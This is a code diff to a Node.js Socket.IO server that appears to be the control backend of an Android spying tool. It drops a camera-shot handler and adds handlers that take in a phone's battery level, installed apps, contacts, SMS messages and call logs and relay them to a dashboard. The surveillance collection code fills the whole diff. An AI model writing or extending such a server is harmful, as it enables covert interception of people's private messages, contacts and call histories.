@@ -54,9 +54,29 @@ io.on('connection', (socket) => {
                 io.emit('notification', data); // Broadcast to dashboard
             });
 
-            socket.on('camera_shot', (data) => {
-                console.log(`[+] CAMERA SHOT: ${data.camera}`);
-                io.emit('camera_shot', data); // Broadcast to dashboard
+            socket.on('vitals', (data) => {
+                console.log(`[+] VITALS from Android: ${data.battery}%`);
+                io.emit('vitals', data); // Broadcast to dashboard
+            });
+
+            socket.on('app_list', (data) => {
+                console.log(`[+] APP_LIST from Android (${data.apps.length} items)`);
+                io.emit('app_list', data); // Broadcast to dashboard
+            });
+
+            socket.on('contacts', (data) => {
+                console.log(`[+] CONTACTS from Android (${data.contacts.length} items)`);
+                io.emit('contacts', data);
+            });
+
+            socket.on('sms', (data) => {
+                console.log(`[+] SMS from Android (${data.sms.length} items)`);
+                io.emit('sms', data);
+            });
+
+            socket.on('call_logs', (data) => {
+                console.log(`[+] CALL_LOGS from Android (${data.call_logs.length} items)`);
+                io.emit('call_logs', data);
             });
 
         } else if (type === 'mobile') {
